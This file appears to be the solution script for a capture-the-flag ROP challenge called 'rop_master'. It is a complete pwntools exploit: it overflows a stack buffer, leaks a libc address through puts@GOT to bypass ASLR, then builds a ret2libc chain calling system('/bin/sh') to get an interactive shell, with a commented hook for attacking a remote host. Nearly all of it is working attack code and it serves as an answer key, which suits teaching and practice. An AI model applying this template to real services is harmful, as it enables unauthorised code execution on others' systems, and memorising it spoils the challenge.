#!/usr/bin/env python3
"""
ROP Chain Master - Solution Script
Demonstrates how to solve the ROP chain challenge

This is the INTENDED solution path. 
Real exploit may need adjustments based on exact libc version.
"""

from pwn import *

# Configuration
BINARY = './rop_master'
LIBC = '/lib/x86_64-linux-gnu/libc.so.6'  # Adjust to target libc

# Load binary and libc
elf = ELF(BINARY)
libc = ELF(LIBC)

# Addresses in binary (no PIE, so fixed)
# Find these with: ROPgadget --binary rop_master
# Or: objdump -d rop_master | grep "pop rdi"
# Or: ropper --file rop_master

# These addresses need to be found in the actual binary!
# Use: objdump -d rop_master | grep -A1 "pop.*rdi"
POP_RDI = 0x401243          # pop rdi; ret
POP_RSI_R15 = 0x401241      # pop rsi; pop r15; ret
RET = 0x401016              # just ret (for stack alignment)

# GOT and PLT addresses
PUTS_GOT = elf.got['puts']      # puts@GOT - we'll leak this
PUTS_PLT = elf.plt['puts']      # puts@PLT
MAIN_ADDR = elf.symbols['main']  # main function address

def exploit():
    # Connect to target
    # p = remote('host', port)
    p = process(BINARY)
    
    # Stage 1: Leak libc address
    # Build ROP chain to call puts(puts@GOT)
    # This prints the actual libc address of puts
    
    payload = b'A' * 64          # Overflow buffer
    payload += b'B' * 8           # Overwrite saved RBP
    payload += p64(POP_RDI)       # pop rdi; ret
    payload += p64(PUTS_GOT)      # rdi = puts@GOT
    payload += p64(PUTS_PLT)      # call puts(puts@GOT)
    payload += p64(MAIN_ADDR)     # return to main for second stage
    
    p.recvuntil(b'payload: ')
    p.sendline(payload)
    
    # Parse leaked address
    p.recvuntil(b'Goodbye!\n')
    leaked = p.recvline().strip()
    leaked += b'\x00' * (8 - len(leaked))  # Pad to 8 bytes
    puts_addr = u64(leaked)
    
    log.info(f"Leaked puts@libc: {hex(puts_addr)}")
    
    # Calculate libc base
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
    
    log.info(f"libc base: {hex(libc_base)}")
    log.info(f"system: {hex(system_addr)}")
    log.info(f"/bin/sh: {hex(bin_sh_addr)}")
    
    # Stage 2: Call system("/bin/sh")
    payload2 = b'A' * 64         # Overflow buffer again
    payload2 += b'B' * 8          # Overwrite saved RBP
    payload2 += p64(RET)          # Stack alignment (movaps issue)
    payload2 += p64(POP_RDI)      # pop rdi; ret
    payload2 += p64(bin_sh_addr)  # rdi = "/bin/sh"
    payload2 += p64(system_addr)  # call system("/bin/sh")
    
    p.recvuntil(b'payload: ')
    p.sendline(payload2)
    
    # Get shell!
    log.success("Got shell!")
    p.interactive()

if __name__ == '__main__':
    print("=" * 50)
    print("ROP Chain Master - Solution Script")
    print("=" * 50)
    print()
    print("This demonstrates the ROP chain attack:")
    print("1. Leak libc address via GOT/PLT")
    print("2. Calculate libc base (bypass ASLR)")
    print("3. Build ROP chain: system('/bin/sh')")
    print()
    print("Run: python3 solve.py")
    print()
    
    exploit()
